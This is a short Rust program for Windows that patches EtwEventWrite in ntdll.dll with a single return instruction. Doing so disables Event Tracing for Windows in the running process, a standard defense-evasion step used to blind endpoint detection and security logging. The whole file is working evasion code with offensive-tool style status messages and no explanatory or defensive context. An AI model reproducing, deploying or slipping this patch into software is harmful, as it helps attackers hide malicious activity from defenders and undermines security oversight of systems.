use std::os::raw::c_void;
use windows::Win32::System::Diagnostics::Debug::{FlushInstructionCache, WriteProcessMemory};
use windows::Win32::System::LibraryLoader::GetModuleHandleA;
use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE};
use windows::Win32::System::Threading::GetCurrentProcess;
use windows::{core::s, Win32::System::LibraryLoader::GetProcAddress};

fn etw() {
    println!("[+] Patching etw for current process...");

    unsafe {
        let patch = [0xc3];
        let handle = GetModuleHandleA(s!("ntdll.dll")).unwrap();
        let etw_addr = GetProcAddress(handle, s!("EtwEventWrite")).unwrap();
        let mut old_permissions = PAGE_PROTECTION_FLAGS::default();

        if VirtualProtect(
            etw_addr as *mut c_void,
            1,
            PAGE_READWRITE,
            &mut old_permissions,
        )
        .is_err()
        {
            panic!("[-] Failed to change protection.");
        }
        if WriteProcessMemory(
            GetCurrentProcess(),
            etw_addr as *mut c_void,
            patch.as_ptr().cast(),
            1,
            None,
        )
        .is_err()
        {
            panic!("[-] Failed to overwrite function.");
        }

        if VirtualProtect(
            etw_addr as *mut c_void,
            1,
            old_permissions,
            &mut old_permissions,
        )
        .is_err()
        {
            panic!("[-] Failed to restore permissions.");
        }
        if FlushInstructionCache(GetCurrentProcess(), Some(etw_addr as *mut c_void), 1).is_err() {
            panic!("[-] Failed to flush cache instruction.");
        }
        println!("[+] ETW patched!");
    }
}

fn main() {
    etw();
}
